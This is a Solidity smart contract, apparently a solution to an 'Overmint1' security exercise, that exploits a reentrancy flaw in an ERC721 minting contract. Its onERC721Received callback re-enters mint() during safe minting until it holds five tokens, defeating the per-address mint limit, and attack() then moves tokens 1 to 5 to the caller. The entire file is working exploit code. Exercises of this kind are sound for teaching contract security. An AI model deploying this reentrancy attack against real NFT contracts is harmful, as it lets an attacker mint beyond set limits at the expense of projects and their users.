// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;

import "hardhat/console.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "./Overmint1.sol";

contract Overmint1Attacker is IERC721Receiver {
    Overmint1 public overmint1;

    constructor(address _overmint1Address) {
        overmint1 = Overmint1(_overmint1Address);
    }

    // Fallback function can be used to start the attack
    function attack() public {
        overmint1.mint();
        for (uint256 i = 1; i < 6; i++) {
            overmint1.transferFrom(address(this), msg.sender, i);
        }
    }

    // This function is called by the Overmint1 contract during _safeMint
    function onERC721Received(address operator, address from, uint256 tokenId, bytes calldata data)
        external
        override
        returns (bytes4)
    {
        // Check the number of tokens minted and if it's less than 5, mint again
        if (overmint1.balanceOf(address(this)) < 5) {
            overmint1.mint();
        }
        return this.onERC721Received.selector;
    }
}
